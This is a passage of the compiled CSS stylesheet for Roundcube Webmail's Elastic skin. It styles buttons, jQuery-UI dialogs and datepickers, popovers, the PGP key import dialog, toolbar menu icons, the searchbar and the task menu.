 .btn-secondary:not(:disabled):not(.disabled).active:focus {
   box-shadow: 0 0 0 0.2rem rgba(139, 159, 167, 0.53);
 }
 .btn-primary {
   color: #fff;
   background: #0099cc;
   border-color: #0099cc;
 }
 .btn-primary:focus {
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.5);
 }
 .btn-primary:hover {
   background: #0086b3;
   border-color: #007ea8;
 }
 .btn-primary.disabled,
 .btn-primary:disabled {
   background: #33ccff;
   border-color: #33ccff;
   opacity: 1;
 }
 .btn-primary:not(:disabled):not(.disabled):active,
 .btn-primary:not(:disabled):not(.disabled).active {
   background: #007399;
   border-color: #006b8f;
 }
 .btn-primary:not(:disabled):not(.disabled):active:focus,
 .btn-primary:not(:disabled):not(.disabled).active:focus {
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.53);
 }
 .btn-danger {
   color: #fff;
   background: #EC1313;
   border-color: #EC1313;
 }
 .btn-danger:focus {
   box-shadow: 0 0 0 0.2rem rgba(236, 19, 19, 0.5);
 }
 .btn-danger:hover {
   background: #d41111;
   border-color: #cb1010;
 }
 .btn-danger.disabled,
 .btn-danger:disabled {
   background: #f47171;
   border-color: #f47171;
   opacity: 1;
 }
 .btn-danger:not(:disabled):not(.disabled):active,
 .btn-danger:not(:disabled):not(.disabled).active {
   background: #bd0f0f;
   border-color: #b30e0e;
 }
 .btn-danger:not(:disabled):not(.disabled):active:focus,
 .btn-danger:not(:disabled):not(.disabled).active:focus {
   box-shadow: 0 0 0 0.2rem rgba(236, 19, 19, 0.53);
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** jQuery-UI widgets' style overrides ***/
 .ui-widget-overlay {
   background-color: rgba(44, 54, 58, 0.5);
   opacity: 1 !important;
 }
 .ui-widget-overlay.datepicker {
   z-index: 119;
 }
 .ui-widget {
   border: 1px solid #d4dbde;
   box-shadow: 3px 3px 5px #f1f3f4;
   border-radius: 0.3rem;
 }
 .ui-menu {
   overflow-y: auto;
   overflow-x: hidden;
   max-height: 400px;
   border-radius: 0.3rem;
   z-index: 240;
   position: absolute;
 }
 .ui-menu .ui-state-active {
   border: 0 !important;
   background-color: #0099cc !important;
 }
 .ui-menu .ui-menu-item {
   white-space: nowrap;
   cursor: default;
 }
 .ui-menu .ui-menu-item-wrapper {
   margin: 0 !important;
 }
 .ui-dialog {
   border-radius: 0;
   box-shadow: none;
 }
 .ui-dialog.no-titlebar .ui-dialog-titlebar {
   display: none;
 }
 .ui-dialog .ui-dialog-titlebar {
   height: 58px;
   border-bottom: 1px solid #ddd;
 }
 .ui-dialog .ui-dialog-titlebar button:before {
   margin: 0;
 }
 .ui-dialog .ui-dialog-title {
   line-height: 58px;
   font-size: 1.25rem;
   padding: 0 3rem 0 1rem;
   color: #2c363a;
 }
 .ui-dialog .ui-dialog-titlebar-close {
   border: 0;
   color: #2c363a;
   background: transparent;
   right: 0;
   top: 0;
   position: absolute;
   padding: 0.25rem 0.5rem;
   margin: 15px 0.5rem;
 }
 .ui-dialog .ui-dialog-titlebar-close:before {
   content: "\f00d";
   line-height: 1.5rem;
   margin: 0 !important;
 }
 .ui-dialog .ui-dialog-content > .popupmenu {
   display: block !important;
 }
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset {
   display: flex;
   justify-content: flex-end;
 }
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset a.btn-link,
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button {
   overflow: hidden;
   text-overflow: ellipsis;
   min-width: 5rem;
   margin: 9px 4px;
 }
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset a.btn-link:last-child,
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button:last-child {
   margin-right: 0;
 }
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset a.btn-link {
   padding-right: 0;
   padding-left: 0;
   text-decoration: none;
   color: #2c363a;
 }
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset a.btn-link:focus {
   background-color: rgba(0, 153, 204, 0.5);
 }
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset a.btn-link.options {
   order: -1;
   padding: 0.375rem 0.25rem;
   margin-right: 0.3rem;
 }
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset a.btn-link.options:before {
   content: "\f013";
   width: 100%;
   height: 1.25em;
 }
 .ui-dialog iframe,
 .ui-dialog .ui-dialog-content.iframe {
   padding: 0;
   width: 100% !important;
   height: 100%;
   border: 0;
   overflow: hidden;
 }
 .ui-dialog,
 .ui-dialog-content {
   box-sizing: initial;
 }
 .ui-widget-content .ui-icon.ui-resizable-se {
   background: url("data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20version%3D%221.1%22%20width%3D%22512px%22%20height%3D%22512px%22%20viewBox%3D%220%200%2016%2016%22%3E%0A%3Cpath%20fill%3D%22%23888888%22%20d%3D%22M6.7%2016l9.3-9.3v-1.4l-10.7%2010.7z%22%2F%3E%0A%3Cpath%20fill%3D%22%23888888%22%20d%3D%22M9.7%2016l6.3-6.3v-1.4l-7.7%207.7z%22%2F%3E%0A%3Cpath%20fill%3D%22%23888888%22%20d%3D%22M12.7%2016l3.3-3.3v-1.4l-4.7%204.7z%22%2F%3E%0A%3Cpath%20fill%3D%22%23888888%22%20d%3D%22M15.7%2016l0.3-0.3v-1.4l-1.7%201.7z%22%2F%3E%0A%3C%2Fsvg%3E%0A");
 }
 /* FIXME: why do I need !important here? */
 @media screen and (max-width: 480px) {
   .ui-dialog {
     width: 100% !important;
     height: 100% !important;
     display: flex;
     flex-direction: column;
     border: 0;
     top: 0 !important;
   }
   .ui-dialog .ui-resizable-handle,
   .ui-dialog .ui-dialog-titlebar-close {
     display: none !important;
   }
   .ui-dialog .ui-dialog-titlebar {
     height: 58px;
     text-align: center;
     background-color: #cfdee6;
   }
   .ui-dialog .ui-dialog-title {
     line-height: 58px;
     font-size: 1rem;
     padding: 0 1rem;
   }
   .ui-dialog .ui-dialog-content {
     flex: 1;
   }
   .ui-dialog .ui-dialog-content:not(.iframe) {
     padding: 1rem;
   }
   .ui-dialog .ui-dialog-buttonpane {
     padding: 0 !important;
     text-align: center !important;
     border-top: 1px solid #ddd;
     height: 58px !important;
     background-color: #cfdee6;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset {
     justify-content: space-around;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button {
     margin: 0 !important;
     padding: 0.45rem;
     border: 0 !important;
     height: 58px;
     box-shadow: none;
     font-size: 90%;
     line-height: 1.5;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button:before {
     display: block !important;
     float: none;
     width: auto;
     height: 1.75rem;
     line-height: 1.75;
     margin: 0 !important;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button:active {
     box-shadow: none;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button.btn-primary,
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button.btn-secondary {
     color: #2c363a;
     background: transparent;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button.btn-danger {
     color: #EC1313;
     background: transparent;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button.disabled,
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button:disabled {
     opacity: 0.5;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button.cancel {
     order: 100;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset a.btn-link {
     color: #2c363a;
     margin: 0;
     padding: 0.45rem;
     font-size: 90%;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset a.btn-link.options:before {
     display: block !important;
     height: 1.75rem;
     line-height: 1.75;
     margin: 0;
   }
 }
 /* Slider widget */
 .ui-slider {
   box-shadow: none;
 }
 .ui-slider .ui-slider-range {
   border-radius: 0.3rem;
   background: #66d9ff;
 }
 .ui-slider .ui-slider-handle {
   border-radius: 0.3rem;
 }
 .ui-slider .ui-slider-handle.ui-state-active {
   background: #0099cc;
   border-color: #00131a;
 }
 /* Datepicker widget */
 .ui-datepicker {
   margin: calc(50vh - 10em) calc(50vw - 10em) !important;
   top: 0 !important;
   left: 0 !important;
   box-shadow: none;
   user-select: none;
 }
 .ui-datepicker:not(.ui-datepicker-inline) {
   z-index: 120 !important;
 }
 .ui-datepicker .ui-datepicker-header,
 .ui-datepicker .ui-datepicker-title {
   line-height: 4rem;
   height: 4rem;
   padding: 0;
 }
 .ui-datepicker .ui-datepicker-header {
   border-bottom: 1px solid #ddd;
 }
 .ui-datepicker .ui-datepicker-header a {
   height: 4rem;
 }
 .ui-datepicker .ui-datepicker-header select {
   display: inline-block;
 }
 .ui-datepicker .ui-icon {
   background-image: none !important;
   background-position: none !important;
 }
 .ui-datepicker .ui-datepicker-prev,
 .ui-datepicker .ui-datepicker-next {
   cursor: pointer;
   width: auto;
 }
 .ui-datepicker .ui-datepicker-prev:before,
 .ui-datepicker .ui-datepicker-next:before {
   content: "\f053";
   margin: 0 0.25em;
   height: auto;
   width: 1em;
 }
 .ui-datepicker .ui-datepicker-prev:before {
   content: "\f053";
 }
 .ui-datepicker .ui-datepicker-next:before {
   content: "\f054";
 }
 .ui-datepicker td a {
   padding: 0;
   line-height: 1.8em;
   border-radius: 0.3rem;
 }
 .ui-datepicker .ui-state-default,
 .ui-datepicker.ui-widget-content .ui-state-default {
   border: 0;
   background: transparent;
   color: #2c363a;
 }
 .ui-datepicker .ui-datepicker-days-cell-over a,
 .ui-datepicker .ui-datepicker-days-cell-over a.ui-state-default,
 .ui-datepicker .ui-state-highlight,
 .ui-datepicker.ui-widget-content .ui-state-highlight {
   background: #66d9ff;
   color: #0099cc;
 }
 .ui-datepicker a.ui-state-active {
   background: #0099cc !important;
   color: #fff !important;
   font-weight: bold;
 }
 .ui-datepicker html.touch td a {
   font-size: 1.2em;
   line-height: 2.2em;
 }
 .input-group > .form-control.hasDatepicker {
   position: initial;
 }
 .minicolors-panel {
   border: 1px solid #d4dbde;
   box-shadow: 3px 3px 5px #f1f3f4;
   border-radius: 0.3rem;
   height: 152px;
   padding: 1px;
 }
 .input-group .minicolors-input {
   width: 100%;
   min-width: 130px;
   border-left: 0;
   border-right: 0;
 }
 @media screen and (max-width: 320px) {
   .ui-widget-content {
     border-radius: 0;
   }
   .ui-menu {
     border-radius: 0.3rem;
     left: 15px !important;
     right: 15px;
     width: auto;
   }
   .ui-dialog .ui-dialog-content:not(.iframe) {
     padding: 0.65rem;
   }
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** Dialogs and popovers ***/
 .popupmenu {
   display: none;
   padding: 0;
   min-width: 180px;
   height: 100%;
 }
 .popupmenu li > a {
   width: 100%;
 }
 .popupmenu.propform {
   overflow: hidden;
   padding: 0.25rem;
 }
 .popupmenu.simplelist {
   min-width: 80px;
 }
 .popup.justified {
   display: flex;
   justify-content: space-around;
 }
 .popover-body {
   padding: 0;
   overflow-x: hidden;
 }
 .popover-body > .popupmenu {
   display: block !important;
 }
 .popover {
   box-shadow: 3px 3px 5px #f1f3f4;
   border-color: #d4dbde;
   padding: 0;
 }
 .popover .popover-header {
   display: none;
 }
 @media screen and (min-width: 769px) {
   .popover .listing li:first-child {
     border-radius: 0.25rem 0.25rem 0 0;
   }
   .popover .listing li:last-child {
     border-radius: 0 0 0.25rem 0.25rem;
   }
 }
 #rcmKSearchpane {
   width: auto;
   height: auto;
 }
 #rcmKSearchpane li {
   padding-right: 0.5rem;
 }
 html.layout-small #rcmKSearchpane,
 html.layout-phone #rcmKSearchpane {
   bottom: auto;
   border: 1px solid #ced4da;
 }
 html.layout-phone #rcmKSearchpane {
   max-width: 100% !important;
 }
 html.layout-small .popover:not(.select-menu),
 html.layout-phone .popover:not(.select-menu) {
   margin: 0 !important;
   padding: 0;
   right: 0;
   left: initial !important;
   bottom: 0;
   top: 0;
   width: 272px;
   transform: none !important;
   border-radius: 0;
   border: 0;
   display: flex;
   flex-direction: column;
   box-shadow: none;
 }
 html.layout-small .popover:not(.select-menu) div.arrow,
 html.layout-phone .popover:not(.select-menu) div.arrow {
   display: none;
 }
 html.layout-small .popover:not(.select-menu) .listing li:last-child,
 html.layout-phone .popover:not(.select-menu) .listing li:last-child {
   border-bottom: 1px solid #f1f3f4;
 }
 html.layout-small .popover-overlay,
 html.layout-phone .popover-overlay {
   z-index: 1000;
   background-color: rgba(44, 54, 58, 0.5);
   position: absolute;
   top: 0;
   bottom: 0;
   width: 100%;
 }
 html.layout-small .popover-header,
 html.layout-phone .popover-header {
   display: block;
   border-radius: 0;
   border: 0;
   padding: 0 0.5em;
   height: 58px;
   min-height: 58px;
   line-height: 58px;
   font-size: 16px;
   color: #fff;
   background-color: #00131a;
 }
 html.layout-small .popover-header:before,
 html.layout-phone .popover-header:before {
   display: none;
 }
 html.layout-small .popover-header a,
 html.layout-phone .popover-header a {
   display: inline-block;
   width: 100%;
 }
 html.layout-small .popover-body > *,
 html.layout-phone .popover-body > * {
   max-height: 100% !important;
 }
 html.touch .popover .listing li a {
   line-height: 47px;
   font-size: 16px;
   padding: 0 0.5em;
 }
 html.touch .popover .listing li a:before {
   float: left;
 }
 .select-menu {
   max-width: initial;
   margin: 0;
 }
 .select-menu .listing li a {
   padding-left: 0.25rem;
   outline: 0;
 }
 .select-menu .popover-header {
   border-radius: 0.25rem 0.25rem 0 0 !important;
 }
 /** PGP Key search/import dialog **/
 .pgpkeyimport div.key {
   position: relative;
   padding: 0.5rem 0;
 }
 .pgpkeyimport div.key.revoked,
 .pgpkeyimport div.key.disabled {
   color: #737677;
 }
 .pgpkeyimport div.key label {
   display: inline-block;
   margin-right: 0.5em;
   margin-bottom: 0;
 }
 .pgpkeyimport div.key label:after {
   content: ":";
 }
 .pgpkeyimport div.key label.keyid {
   display: none;
 }
 .pgpkeyimport div.key label + a,
 .pgpkeyimport div.key label + span {
   line-height: 2.6rem;
   margin-right: 1em;
   white-space: nowrap;
   text-decoration: none;
 }
 .pgpkeyimport div.key label.keyid + a {
   font-weight: bold;
 }
 .pgpkeyimport div.key label.keyid + a:before {
   content: "\f084";
 }
 .pgpkeyimport ul.uids {
   margin: 0;
   padding: 0;
 }
 .pgpkeyimport li.uid {
   border: 0;
   padding: 0.25rem 0 0 1.5em;
   line-height: 1.5rem !important;
   list-style-type: none;
 }
 .pgpkeyimport li.uid:before {
   content: "\f007";
   opacity: 0.25;
   font-size: 1em;
   line-height: 1.25;
 }
 .pgpkeyimport button.importkey {
   position: absolute;
   top: 0.5rem;
   right: 0;
 }
 .pgpkeyimport button:disabled {
   display: none;
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** Toolbar widget ***/
 .menu {
   margin: 0;
   text-align: center;
   white-space: nowrap;
 }
 .menu a {
   overflow: hidden;
   text-overflow: ellipsis;
   text-decoration: none;
 }
 .menu a:before {
   content: "\00a0";
 }
 .menu a:hover,
 .menu a:focus {
   outline: 0;
 }
 .menu a:not(.disabled):focus,
 .menu a:not(.disabled):hover {
   background-color: #c5d7e1;
 }
 .menu.toolbar li {
   display: inline-block;
   height: 58px;
 }
 .menu.toolbar a {
   color: #2c363a;
   display: block;
   float: left;
   border: 0 !important;
   height: 58px;
   min-width: 3.2rem;
   max-width: 6rem;
   width: auto;
   padding: 0.45rem;
   line-height: 1.5;
   cursor: pointer;
   font-size: 1rem;
   text-align: center;
 }
 .menu.toolbar a:before {
   height: 1.75rem !important;
   float: none !important;
   width: auto !important;
   margin: 0 !important;
 }
 .menu.toolbar a.selected {
   color: #41b849;
 }
 .menu.toolbar > .spacer {
   width: 1em;
 }
 .menu.toolbar .dropbutton:not(.disabled):hover {
   background-color: #c5d7e1;
 }
 .menu.toolbar .dropbutton a.dropdown {
   padding: 0 0.3rem;
 }
 .menu.toolbar .dropbutton a.dropdown:before {
   line-height: 58px;
 }
 .menu.toolbar .dropbutton a.dropdown:hover {
   background-color: #b4ccd8;
 }
 .menu span.inner {
   font-size: 90%;
   font-weight: normal;
 }
 .menu .dropbutton {
   display: inline-block;
 }
 .menu .dropbutton a.dropdown {
   font-size: 75%;
   min-width: 0;
 }
 html.ie11 .menu .dropbutton a.dropdown:before {
   font-size: 80%;
 }
 .menu .dropbutton a.dropdown span.inner {
   display: none;
 }
 .menu .dropbutton a:first-child {
   padding-right: 0;
 }
 .menu.pagenav {
   display: flex;
   justify-content: space-between;
   align-items: center;
   padding: 0 !important;
   font-size: 100%;
 }
 .menu.pagenav a {
   flex-grow: 1;
   display: inline-block;
   min-width: 2rem !important;
   height: 35px;
   color: #2c363a;
 }
 .menu.pagenav a:before {
   margin: 0;
   display: inline;
   float: none;
   line-height: 35px;
 }
 .menu.pagenav .pagenav-text {
   overflow: hidden;
   text-overflow: ellipsis;
   color: #737677;
   flex-grow: 4;
   font-size: 80%;
 }
 .menu.pagenav input {
   width: 3rem;
   max-width: 5rem;
   font-size: 90%;
   text-align: center;
   max-height: 1.6rem;
   margin: 0 0.2rem;
 }
 html.layout-phone .menu.pagenav input {
   display: none;
 }
 .menu.pagenav span.inner {
   display: none;
 }
 .menu.pagenav.pagenav-list {
   cursor: pointer;
   background-color: #fbfbfb;
   border-bottom: 1px solid #f1f3f4;
 }
 .menu.pagenav.pagenav-list a {
   flex-grow: unset;
 }
 .menu.pagenav.pagenav-list .pagenav-text {
   text-align: left;
   font-size: 100%;
 }
 .menu.pagenav.pagenav-list + .navlist {
   background-color: #fbfbfb;
 }
 .menu.pagenav.pagenav-list.expanded + .navlist {
   border-bottom: 1px solid #d4dbde;
 }
 .menu.content-frame-navigation.hide-nav-buttons a.next,
 .menu.content-frame-navigation.hide-nav-buttons a.prev {
   display: none;
 }
 .menu .listselectors {
   max-width: 100%;
   display: flex;
   justify-content: space-around;
 }
 .menu .buttons {
   display: block;
 }
 .menu .buttons button {
   display: block;
   float: left;
   cursor: pointer;
   color: #2c363a;
   background-color: transparent;
   border: 0;
   padding: 0;
   height: 58px;
   line-height: 58px;
   width: 2.5em;
 }
 .menu .buttons button:before {
   font-size: 1.75rem;
 }
 .popover .menu li {
   display: block;
   height: auto;
   text-align: left;
 }
 .popover .menu li.spacer {
   display: none;
 }
 .popover .menu li:last-child {
   border: 0;
 }
 .popover .menu li.separator {
   line-height: 1.5rem !important;
   font-size: 0.75rem !important;
   padding: 0 0.5rem;
   color: #737677;
   background-color: #f1f3f4;
 }
 .popover .menu li.separator label {
   margin: 0;
 }
 .popover .menu li a {
   height: unset;
   max-width: 100%;
   width: 100%;
   line-height: 35px;
   display: block;
   padding: 0 0.5rem;
   text-align: left;
 }
 .popover .menu li a:before {
   line-height: inherit;
   height: inherit !important;
   margin-right: 0.5rem !important;
   float: left !important;
   width: 1.18em !important;
   min-width: 1.18em;
 }
 .popover .menu li a:not(.disabled):hover {
   color: #fff;
   background-color: #0099cc;
 }
 .popover .menu li a[aria-haspopup] {
   display: flex;
 }
 .popover .menu li a[aria-haspopup]:after {
   color: #737677;
   font-size: 0.9em;
   margin: 0 0 0 0.2em;
   min-width: 1.18em;
   content: "\f054";
 }
 html.layout-small .popover .menu li a[aria-haspopup]:after {
   margin: 0 0.2em;
 }
 .popover .menu li a[aria-haspopup].dropdown:after {
   color: #2c363a;
   margin: 0 0.6em !important;
 }
 .popover .menu li a[aria-haspopup]:hover:after {
   color: #fff;
 }
 .popover .menu li a[aria-haspopup] > span {
   overflow: hidden;
   text-overflow: ellipsis;
   flex: 1;
 }
 .popover .menu li span.inner {
   font-size: 100%;
 }
 .popover .menu .dropbutton {
   display: flex;
 }
 .popover .menu .dropbutton a:first-child {
   overflow: hidden;
   text-overflow: ellipsis;
   flex: 1;
 }
 .popover .menu .dropbutton:not(.disabled):hover {
   background-color: #f6f6f6;
 }
 .popover .menu .dropbutton a.dropdown {
   width: 3.5rem;
   padding: 0 0.5em;
   background-color: #f6f6f6;
 }
 .popover .menu .dropbutton a.dropdown:hover {
   background-color: #0099cc;
 }
 .popover .menu .dropbutton a.dropdown:before,
 .popover .menu .dropbutton a.dropdown span.inner {
   display: none;
 }
 .popover .menu.no-icon a:before {
   display: none;
 }
 @media screen and (min-width: 769px) {
   .content-frame-navigation {
     display: none !important;
   }
   .header a.button.icon:not(.disabled):focus,
   .header a.button.icon:not(.disabled):hover {
     background-color: #c5d7e1;
     outline: 0;
   }
   .header a.button.icon:before {
     margin: 0;
   }
 }
 @media screen and (max-width: 768px) {
   .menu.footer {
     justify-content: space-around !important;
   }
   .menu.footer > * {
     flex-grow: 1;
   }
   .menu.footer .buttons {
     display: flex;
     justify-content: space-evenly;
   }
   .menu.footer .listselectors > * {
     flex-grow: 1;
   }
   .menu.listing a {
     color: #2c363a;
   }
 }
 @media screen and (min-width: 1201px) {
   a.toolbar-button {
     line-height: 1.5;
     padding: 0.45rem;
   }
   a.toolbar-button:before {
     float: none !important;
     height: 1.75rem !important;
     line-height: 1.5;
     width: auto !important;
   }
   a.toolbar-button span.inner {
     display: inline !important;
     font-weight: normal;
     font-size: 90%;
   }
 }
 /*** Menu button icons ***/
 .menu a.mail:before {
   content: "\f0e0";
 }
 .menu a.contacts:before {
   content: "\f0c0";
 }
 .menu a.options:before {
   content: "\f1de";
 }
 .menu a.settings:before {
   content: "\f013";
 }
 .menu a.help:before {
   content: "\f1cd";
 }
 .menu a.logout:before {
   content: "\f011";
 }
 .menu a.about:before {
   content: "\f128";
 }
 .menu a.refresh:before {
   content: "\f021";
 }
 .menu a.compose:before {
   content: "\f044";
 }
 .menu a.calendar:before {
   content: "\f073";
 }
 .menu a.tasklist:before {
   content: "\f0ae";
 }
 .menu a.files:before {
   content: "\f07b";
 }
 .menu a.notes:before {
   content: "\f249";
 }
 .menu a.chat:before {
   content: "\f086";
 }
 .menu a.actions:before {
   content: "\f013";
 }
 .menu a.addressbook:before {
   content: "\f007";
 }
 .menu a.archive:before {
   content: "\f187";
 }
 .menu a.assigngroup:before {
   content: "\f234";
 }
 .menu a.attach:before,
 .menu a.vcard:before {
   content: "\f0c6";
 }
 .menu a.next:before {
   content: "\f061";
 }
 .menu a.prev:before,
 .menu a.back:before {
   content: "\f060";
 }
 .menu a.check:before {
   content: "";
 }
 .menu a.check.selected:before {
   content: "\f00c";
 }
 .menu a.closewin:before {
   content: "\f410";
 }
 .menu a.collapse:before {
   content: "\f107";
 }
 .menu a.copy:before {
   content: "\f0c5";
 }
 .menu a.create:before {
   content: "\f0fe";
 }
 .menu a.delete:before {
   content: "\f2ed";
 }
 .menu a.download:before,
 .menu a.download.eml:before,
 .menu a.download.maildir:before,
 .menu a.download.mbox:before {
   content: "\f019";
 }
 .menu a.dropdown:before {
   content: "\f0d7";
 }
 .menu a.edit:before {
   content: "\f303";
 }
 .menu a.encrypt:before,
 .menu a.enigma:before {
   content: "\f023";
 }
 .menu a.encrypt.sign:before {
   content: "\f023";
 }
 .menu a.expand:before {
   content: "\f105";
 }
 .menu a.expand.all:before {
   content: "\f103";
 }
 .menu a.expand.none:before {
   content: "\f102";
 }
 .menu a.export:before,
 .menu a.export.all:before,
 .menu a.export.selection:before {
   content: "\f019";
 }
 .menu a.expunge:before {
   content: "\f78c";
 }
 .menu a.extwin:before {
   content: "\f360";
 }
 .menu a.filterlink:before {
   content: "\f0b0";
 }
 .menu a.firstpage:before {
   content: "\f100";
 }
 .menu a.nextpage:before {
   content: "\f105";
 }
 .menu a.prevpage:before {
   content: "\f104";
 }
 .menu a.lastpage:before {
   content: "\f101";
 }
 .menu a.flag:before,
 .menu a.select.flagged:before {
   content: "\f024";
   font-weight: 900;
 }
 .menu a.unflag:before {
   content: "\f024";
   font-weight: 400;
 }
 .menu a.folders:before {
   content: "\f07b";
 }
 .menu a.forward:before,
 .menu a.forward.attachment:before,
 .menu a.forward.bounce:before,
 .menu a.forward.inline:before {
   content: "\f064";
 }
 .menu a.import:before,
 .menu a.upload:before {
   content: "\f093";
 }
 .menu a.insertresponse:before {
   content: "\f075";
 }
 .menu a.junk:before {
   content: "\f7e4";
 }
 .menu a.notjunk:before {
   content: "\f01c";
 }
 .menu a.markmessage:before {
   content: "\f02b";
 }
 .menu a.more:before {
   content: "\f141";
 }
 .menu a.move:before {
   content: "\f07c";
 }
 .menu a.print:before {
   content: "\f02f";
 }
 .menu a.properties:before {
   content: "\f15b";
 }
 .menu a.purge:before {
   content: "\f12d";
 }
 .menu a.qrcode:before {
   content: "\f029";
 }
 .menu a.read:before {
   content: "\f2b6";
   font-weight: 400;
 }
 .menu a.unread:before,
 .menu a.expand.unread:before,
 .menu a.select.unread:before {
   content: "\f0e0";
   font-weight: 900;
 }
 .menu a.recipient:before {
   content: "\f0e0";
   font-weight: 400;
 }
 .menu a.refresh:before {
   content: "\f021";
 }
 .menu a.remove:before {
   content: "\f12d";
 }
 .menu a.removegroup:before {
   content: "\f235";
 }
 .menu a.rename:before {
   content: "\f303";
 }
 .menu a.reply:before {
   content: "\f3e5";
 }
 .menu a.reply-all:before,
 .menu a.reply.all:before,
 .menu a.reply.list:before {
   content: "\f122";
 }
 .menu a.responses:before {
   content: "\f075";
 }
 .menu a.rotate:before {
   content: "\f2f9";
 }
 .menu a.save:before {
   content: "\f0c7";
   font-weight: 400;
 }
 .menu a.search:before {
   content: "\f002";
 }
 .menu a.search.delete:before {
   content: "\f2ed";
 }
 .menu a.select:before {
   content: "\f245";
 }
 .menu a.select.all:before {
   content: "\f069";
 }
 .menu a.select.invert:before {
   content: "\f14a";
 }
 .menu a.select.none:before {
   content: "\f00d";
   font-weight: 900;
 }
 .menu a.select.page:before {
   content: "\f0c9";
   font-weight: 900;
 }
 .menu a.selection:before {
   content: "\f14a" !important;
   font-weight: 400 !important;
 }
 .menu a.send:before {
   content: "\f1d8";
 }
 .menu a.showurl:before {
   content: "\f0c1";
 }
 .menu a.signature:before {
   content: "\f5b7";
 }
 .menu a.source:before {
   content: "\f1c9";
 }
 .menu a.spellcheck:before {
   content: "\f891";
 }
 .menu a.status:before {
   content: "\f0eb";
   font-weight: 400;
 }
 .menu a.submit:before {
   content: "\f00c";
 }
 .menu a.threads:before {
   content: "\f086";
 }
 .menu a.zoomin:before {
   content: "\f00e";
 }
 .menu a.zoomout:before {
   content: "\f010";
 }
 /*** Searchbar and searchoptions widgets ***/
 .searchbar {
   height: 36px;
   min-height: 36px;
   line-height: 36px;
   background-color: #fbfbfb;
   border-bottom: 1px solid #f1f3f4;
   display: flex;
   align-items: center;
   overflow: hidden;
   position: relative;
 }
 .searchbar form {
   flex: 1;
   display: flex;
 }
 .searchbar form:before {
   content: "\f002";
   height: 36px;
   color: #737677;
   margin: 0 0 0 0.75rem;
 }
 .searchbar input {
   width: 100%;
   border: 0;
   background: transparent;
   padding: 0.5rem;
   line-height: normal;
   outline: 0;
 }
 .searchbar input::-ms-clear {
   display: none;
 }
 .searchbar a {
   color: #2c363a;
 }
 .searchbar a:before {
   width: 2rem;
   height: 36px;
   margin: 0;
 }
 .searchbar a.options:before {
   content: "\f107";
 }
 .searchbar a.reset:before {
   content: "\f00d";
   font-size: 1rem;
 }
 .searchbar a.unread:before {
   content: "\f0e0";
   font-weight: 900;
 }
 .searchbar a.reset,
 .searchbar a.search {
   display: none;
 }
 .searchbar a.selected {
   color: #41b849;
 }
 .searchbar span.inner {
   display: none;
 }
 .searchbar.active a.reset {
   display: inline;
 }
 .searchbar.open a.options:before {
   content: "\f106";
 }
 .searchoptions button.search {
   width: 100%;
 }
 .searchoptions ul.proplist + div {
   margin-top: 1rem;
 }
 .searchoptions .input-group:not(:last-child) {
   margin-bottom: 0.5rem;
 }
 .searchoptions .input-group .input-group-prepend {
   width: 30%;
 }
 .searchoptions .input-group label {
   width: 100%;
 }
 .searchoptions .formbuttons {
   display: block !important;
 }
 /*** Taskmenu ***/
 #taskmenu a {
   display: block;
   float: none;
 }
 @media screen and (max-width: 480px) {
   #taskmenu {
     z-index: 30001;
     overflow-x: hidden;
   }
   #taskmenu a {
     max-width: unset;
     padding: 0 0.5em;
     margin-top: 1px;
     text-align: left;
     line-height: 47px;
     height: 47px;
     border-bottom: 1px solid #f1f3f4 !important;
     color: #2c363a;
     font-size: 1.2rem;
   }
   #taskmenu a:before {
     float: left !important;
     width: 1.2em !important;
     margin-right: 0.5rem !important;
   }
   #taskmenu span.inner {
     font-size: 100%;
   }
 }
 @media screen and (min-width: 481px) {
   #taskmenu a {
     color: #cfdee6;
     padding: 0.45rem 0;
     min-width: unset;
   }
   #taskmenu a.selected {
     color: #cfdee6;
     background: #1a1a1a;
   }
   #taskmenu a.selected:hover {
     color: #fff;
     background: #1a1a1a;
   }
   #taskmenu a:hover {
     color: #cfdee6;
